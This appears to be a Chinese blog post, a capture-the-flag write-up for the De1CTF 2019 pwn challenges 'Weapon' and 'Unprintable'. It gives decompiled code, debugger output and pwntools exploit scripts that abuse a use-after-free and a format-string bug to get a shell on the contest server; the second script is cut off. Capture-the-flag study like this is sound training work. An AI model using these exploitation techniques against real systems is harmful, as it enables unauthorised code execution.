<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="My Solve: 为抢血来的，前两题都是第四个交的，一丝难受，还好最后一个抢了二血真是愈来愈菜，近一个月没搞pwn了，感觉kernel pwn有点玩脱了，没搞定 0x01 WeaponAnalyze比较简单的一题，死在网速上，错失三血在delete过程中很明显存在UAF： 1234567891011121314151617unsigned __int64 delete()&amp;#123;  sig">
<meta property="og:type" content="article">
<meta property="og:title" content="De1CTF 2019  PWN">
<meta property="og:url" content="http://yoursite.com/2019/08/06/De1CTF-2019-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="My Solve: 为抢血来的，前两题都是第四个交的，一丝难受，还好最后一个抢了二血真是愈来愈菜，近一个月没搞pwn了，感觉kernel pwn有点玩脱了，没搞定 0x01 WeaponAnalyze比较简单的一题，死在网速上，错失三血在delete过程中很明显存在UAF： 1234567891011121314151617unsigned __int64 delete()&amp;#123;  sig">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-294a4eb723a7b7d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-7ebfb039a277eb63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-e422cabc650f6013.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2019-08-06T01:04:01.000Z">
<meta property="article:modified_time" content="2019-08-06T01:28:22.000Z">
<meta property="article:author" content="Kirin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-294a4eb723a7b7d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>De1CTF 2019  PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/08/19/SUCTF-2019-PWN/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/07/28/LOST-YOU-FOREVER/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&text=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&is_video=false&description=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=De1CTF 2019  PWN&body=Check out this article: http://yoursite.com/2019/08/06/De1CTF-2019-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&title=De1CTF 2019  PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/06/De1CTF-2019-PWN/&name=De1CTF 2019  PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Weapon"><span class="toc-number">1.</span> <span class="toc-text">0x01 Weapon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Unprintable"><span class="toc-number">2.</span> <span class="toc-text">0x02 Unprintable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-A-B-Judge"><span class="toc-number">3.</span> <span class="toc-text">0x03  A+B Judge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Mimic-note"><span class="toc-number">4.</span> <span class="toc-text">0x04  Mimic_note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze-2"><span class="toc-number">4.1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        De1CTF 2019  PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-08-06T01:04:01.000Z" itemprop="datePublished">2019-08-06</time>
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="https://upload-images.jianshu.io/upload_images/7434375-294a4eb723a7b7d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Venom"></p>
<p><strong>My Solve:</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/7434375-7ebfb039a277eb63.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PWN"><br>为抢血来的，前两题都是第四个交的，一丝难受，还好最后一个抢了二血<br>真是愈来愈菜，近一个月没搞pwn了，感觉kernel pwn有点玩脱了，没搞定</p>
<h2 id="0x01-Weapon"><a href="#0x01-Weapon" class="headerlink" title="0x01 Weapon"></a>0x01 Weapon</h2><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>比较简单的一题，死在网速上，错失三血<br>在delete过程中很明显存在UAF：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input idx :"</span>);</span><br><span class="line">  v1 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> &amp;&amp; v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;unk_202060 + <span class="number">2</span> * v1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有show操作，选择利用IO_FILE来leak<br>add过程中chunk有大小限制:0-0x60<br>所以先利用uaf修改一个fd低位来修改一个chunksize构造unsortbin，此时chunk即会包含main_arena+88<br>而后再利用UAF将一个fd指向这里，并修改这里的fd(main_arena+88)低字节指向stdout前的位置(包含合法size”\x7F”)，进而修改stdout结构体的_flags和_IO_write_base来输出一段数据(包含libc_addr)<br>leak后再次利用uaf修改malloc_hook为one_target即可get shell</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./pwn")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,name)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"weapon: "</span>,str(size))</span><br><span class="line">   p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">   p.sendafter(<span class="string">" name:\n"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,<span class="string">"2"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"input idx :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,name)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"idx: "</span>,str(index))</span><br><span class="line">   p.sendafter(<span class="string">"new content:\n"</span>,name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p=remote(<span class="string">"139.180.216.34"</span>,<span class="string">"8888"</span>)</span><br><span class="line">		add(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">"\x00"</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>))</span><br><span class="line">		add(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">		add(<span class="number">2</span>,<span class="number">0x50</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">		add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">		delete(<span class="number">0</span>)</span><br><span class="line">		delete(<span class="number">1</span>)</span><br><span class="line">		edit(<span class="number">1</span>,<span class="string">"\x18"</span>)</span><br><span class="line">		add(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">"ccccc"</span>)</span><br><span class="line">		add(<span class="number">1</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">		delete(<span class="number">0</span>)</span><br><span class="line">		add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">"\xdd\x25"</span>)</span><br><span class="line">		add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">		delete(<span class="number">3</span>)</span><br><span class="line">		delete(<span class="number">5</span>)</span><br><span class="line">		edit(<span class="number">5</span>,<span class="string">"\x30"</span>)</span><br><span class="line">		add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">		add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"bbbbb"</span>)</span><br><span class="line">		add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"ccccc"</span>)</span><br><span class="line">		edit(<span class="number">6</span>,<span class="string">"\x00"</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">"\x00"</span>)</span><br><span class="line">		p.recvuntil(<span class="string">"\x7f"</span>)</span><br><span class="line">		p.recv(<span class="number">2</span>)</span><br><span class="line">		libc_addr=u64(p.recv(<span class="number">8</span>))<span class="number">-0x7ffff7dd26a3</span>+<span class="number">0x7ffff7a0d000</span></span><br><span class="line">		<span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">		add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"eeeeeeee"</span>)</span><br><span class="line">		delete(<span class="number">6</span>)</span><br><span class="line">		edit(<span class="number">6</span>,p64(libc_addr+<span class="number">0x7ffff7dd1b10</span><span class="number">-0x7ffff7a0d000</span><span class="number">-0x23</span>))</span><br><span class="line">		add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"aaaaa"</span>)</span><br><span class="line">		add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"\x00"</span>*<span class="number">0x13</span>+p64(libc_addr+<span class="number">0xf1147</span>))</span><br><span class="line">		<span class="comment">#gdb.attach(p)</span></span><br><span class="line">		p.interactive()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"error"</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02-Unprintable"><a href="#0x02-Unprintable" class="headerlink" title="0x02 Unprintable"></a>0x02 Unprintable</h2><h3 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h3><p>也是第四个交，无奈ing<br>程序GOT表不可写<br>main function会输出stack addr后关闭stdout<br>而后会有一次格式化字符串漏洞，最后exit</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to Ch4r1l3's printf test"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is your gift: %p\n"</span>, &amp;v3);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf, buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先考虑复用格式化字符串漏洞<br>在exit的时候发现了一处指针可控程序流且地址在栈上:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">RAX  <span class="number">0x600e48</span> (_DYNAMIC+<span class="number">96</span>) — <span class="number">0x1c</span></span><br><span class="line"> RBX  <span class="number">0x7f9a13da1168</span> — <span class="number">0x2c8</span></span><br><span class="line"> RCX  <span class="number">0x4</span></span><br><span class="line"> RDX  <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x7f9a13da0948</span> (_rtld_global+<span class="number">2312</span>) — <span class="number">0x0</span></span><br><span class="line"> RSI  <span class="number">0x0</span></span><br><span class="line"> R8   <span class="number">0x4</span></span><br><span class="line"> R9   <span class="number">0x3</span></span><br><span class="line"> R10  <span class="number">0x7ffefcd81518</span> — <span class="number">0x7f9a13da09d8</span> (_rtld_global+<span class="number">2456</span>) — <span class="number">0x7f9a13b7a000</span> — jg     <span class="number">0x7f9a13b7a047</span></span><br><span class="line"> R11  <span class="number">0x3</span></span><br><span class="line"> R12  <span class="number">0x6010a0</span> (buf+<span class="number">64</span>) — <span class="number">0x400726</span> (main) — push   rbp</span><br><span class="line"> R13  <span class="number">0x0</span></span><br><span class="line"> R14  <span class="number">0x7ffefcd81500</span> — <span class="number">0x7f9a13da1168</span> — <span class="number">0x2c8</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7ffefcd815c0</span> — <span class="number">0x7f9a13b745f8</span> (__exit_funcs) — <span class="number">0x7f9a13b75c40</span> (initial) — <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7ffefcd81500</span> — <span class="number">0x7f9a13da1168</span> — <span class="number">0x2c8</span></span><br><span class="line"> RIP  <span class="number">0x7f9a13b8ade3</span> (_dl_fini+<span class="number">819</span>) — call   qword ptr [r12 + rdx*<span class="number">8</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">  <span class="number">0x7f9a13b8ade3</span> &lt;_dl_fini+<span class="number">819</span>&gt;    call   qword ptr [r12 + rdx*<span class="number">8</span>] &lt;<span class="number">0x400726</span>&gt;</span><br><span class="line">        rdi: <span class="number">0x7f9a13da0948</span> (_rtld_global+<span class="number">2312</span>) — <span class="number">0x0</span></span><br><span class="line">        rsi: <span class="number">0x0</span></span><br><span class="line">        rdx: <span class="number">0x0</span></span><br><span class="line">        rcx: <span class="number">0x4</span></span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f9a13b8ade7</span> &lt;_dl_fini+<span class="number">823</span>&gt;    test   r13d, r13d</span><br><span class="line">   <span class="number">0x7f9a13b8adea</span> &lt;_dl_fini+<span class="number">826</span>&gt;    lea    r13d, [r13 - <span class="number">1</span>]</span><br><span class="line">   <span class="number">0x7f9a13b8adee</span> &lt;_dl_fini+<span class="number">830</span>&gt;    jne    _dl_fini+<span class="number">816</span> &lt;<span class="number">0x7f9a13b8ade0</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7f9a13b8adf0</span> &lt;_dl_fini+<span class="number">832</span>&gt;    mov    rax, qword ptr [rbx + <span class="number">0xa8</span>]</span><br><span class="line">   <span class="number">0x7f9a13b8adf7</span> &lt;_dl_fini+<span class="number">839</span>&gt;    test   rax, rax</span><br></pre></td></tr></table></figure>
<p>在这里rdx固定，r12由:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;_dl_fini+788&gt;    add    r12, qword ptr [rbx] &lt;0x600dd8&gt;</span><br></pre></td></tr></table></figure>
<p>确定，而rbx=0x7f9a13da1168，这个地址在栈上存在，格式化字符串时修改时对应%26$n，r12在add前固定，为0x600dd8<br>所以可以更改[rbx]内的偏移，使在call   qword ptr [r12 + rdx*8]时，r12+rdx*8指向buf内的空间，对应位置存入main_func_addr即可实现复用一次<br>这时候就可以在第一次格式化字符串时修改偏移复用，并在栈中修改一个栈上的指针指向第二次printf时返回地址对应位置，即可在复用printf时修改自己的返回地址实现再次复用<br>不过这里注意因为<strong>%n最大修改为0x2000</strong>,所以我们要在最开始获得一个stack_addr&amp;0xFFFF&lt;0x2000的栈地址<br>再次复用时为了方便，避免下次返回地址再次变化，修改返回地址为0x4007A3,此时栈不会继续增长：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007A3                 mov     edx, 1000h      ; nbytes</span><br><span class="line">.text:00000000004007A8                 mov     esi, offset buf ; buf</span><br><span class="line">.text:00000000004007AD                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004007B2                 call    read</span><br><span class="line">.text:00000000004007B7                 mov     edi, offset buf ; format</span><br><span class="line">.text:00000000004007BC                 mov     eax, 0</span><br><span class="line">.text:00000000004007C1                 call    printf</span><br><span class="line">.text:00000000004007C6                 mov     edi, 0          ; status</span><br><span class="line">.text:00000000004007CB                 call    exit</span><br></pre></td></tr></table></figure>
<p>下面考虑栈迁移，便于构造ROP链<br>首先看到一条比较好的gadget:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
<p>这时候只需要修改printf返回地址为此处，并在下一地址写入buf内的地址<br>即可在printf返回时pop rsp，使rsp指向buf内的地址，完成栈迁移<br>栈迁移后考虑构造execv(“/bin/sh”)<br>首先要获得一个syscall的地址，程序本身没有syscall的gadget<br>而且buf内没有可用地址，所以考虑先调用libc函数在栈中留下一个syscall附近地址，尝试后发现puts可以，调用puts后可以在栈中留下一个libc地址，且此地址附近(更改最低位一字节后便可以)存在syscall<br>此时获得了syscall<br>rdi，rsi可以直接利用pop的gadget构造<br>最后需要构造rax和rdx<br>rdx可以通过:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400810                 mov     rdx, r13</span><br><span class="line">.text:0000000000400813                 mov     rsi, r14</span><br><span class="line">.text:0000000000400816                 mov     edi, r15d</span><br><span class="line">.text:0000000000400819                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
<p>间接获得<br>rax我选择最后read 0x3b个字节来利用read的返回值设置<br>设置好所有寄存器后跳入预先在buf里修改好的syscall地址即可获得shell<br>因为没有stdout，所以获得shell直接将输出转入stderr或者stdin即可:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag &gt;&amp;0</span><br><span class="line">cat flag &gt;&amp;2</span><br></pre></td></tr></table></figure>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment"># def fuck(ad,value):</span></span><br><span 